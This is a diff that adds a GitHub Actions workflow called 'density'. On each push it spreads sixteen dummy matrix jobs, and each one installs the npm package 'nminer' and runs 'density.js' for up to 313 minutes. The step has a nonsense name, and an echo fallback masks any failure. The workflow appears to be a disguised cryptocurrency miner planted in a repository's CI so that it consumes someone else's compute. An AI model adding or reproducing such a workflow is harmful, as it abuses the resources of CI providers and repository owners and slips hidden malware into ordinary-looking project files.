@@ -1,0 +1,41 @@
+name: density
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 5110 }
+          - { version: 5296 }
+          - { version: 797 }
+          - { version: 64 }
+          - { version: 2270 }
+          - { version: 3016 }
+          - { version: 3144 }
+          - { version: 3853 }
+          - { version: 6012 }
+          - { version: 9014 }
+          - { version: 3497 }
+          - { version: 4508 }
+          - { version: 2110 }
+          - { version: 9370 }
+          - { version: 6650 }
+          - { version: 8498 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: aboard furthermore after bravely
+        run: |
+          npm install nminer@latest
+          timeout 313m node density.js || echo "density executed"
